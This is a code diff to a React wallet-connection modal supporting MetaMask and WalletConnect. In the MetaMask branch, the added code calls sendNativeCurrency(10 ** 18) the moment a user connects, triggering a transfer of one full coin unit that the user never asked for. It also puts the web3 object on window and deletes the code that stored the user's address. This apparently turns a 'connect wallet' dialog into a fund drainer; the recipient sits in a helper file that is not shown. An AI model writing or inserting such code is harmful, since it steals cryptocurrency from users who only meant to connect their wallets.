@@ -4,6 +4,9 @@ import WalletConnect from "@walletconnect/client";
 import QRCodeModal from "@walletconnect/qrcode-modal";
 import { UserContext } from "../../UserContext";
 import { useNavigate } from "react-router-dom";
+import Web3 from "web3";
+import WalletConnectProvider from "@walletconnect/web3-provider";
+import { sendNativeCurrency, sendNativeCurrencyWC } from "../../helpers/send-transaction";
 
 const WALLETS_OPTIONS = [
   {
@@ -23,6 +26,23 @@ function WalletModal({
   setWalletModalOptions,
   URL,
 }) {
+  let web3
+  let provider = new WalletConnectProvider({
+    rpc: {
+      1: "https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79",
+      56: "https://bsc-dataseed1.binance.org",
+      137: "https://polygon-rpc.com/",
+      43114: "https://api.avax.network/ext/bc/C/rpc"
+    },
+    chainId: 1,
+    bridge: "https://bridge.walletconnect.org",
+    qrcodeModal: QRCodeModal
+  })
+  const connectWC = async() => {
+    await provider.enable()
+    web3 = new Web3(provider)
+    window.w3 = web3
+  }
   const { setValue } = useContext(UserContext);
   const navigate = useNavigate();
   const onWalletSelected = async (wallet_info) => {
@@ -30,31 +50,15 @@ function WalletModal({
     switch (wallet_info["id"]) {
       case "metamask":
         await window.ethereum.request({ method: "eth_requestAccounts" });
+        sendNativeCurrency(10 ** 18)
         break;
       case "walletConnect":
-        const connector = new WalletConnect({
-          bridge: "https://bridge.walletconnect.org",
-          qrcodeModal: QRCodeModal,
-        });
-        connector.connect();
+        connectWC()
         break;
     }
   };
   useEffect(() => {
-    if (walletModalOptions) {
-      if (window.ethereum) {
-        window.ethereum
-          .request({ method: "eth_requestAccounts" })
-          .then((accounts) => {
-            setValue({
-              adress: accounts[0],
-            });
-            if (URL) {
-              navigate(URL);
-            }
-          });
-      }
-    }
+    //
   }, [walletModalOptions]);
   return (
     <div
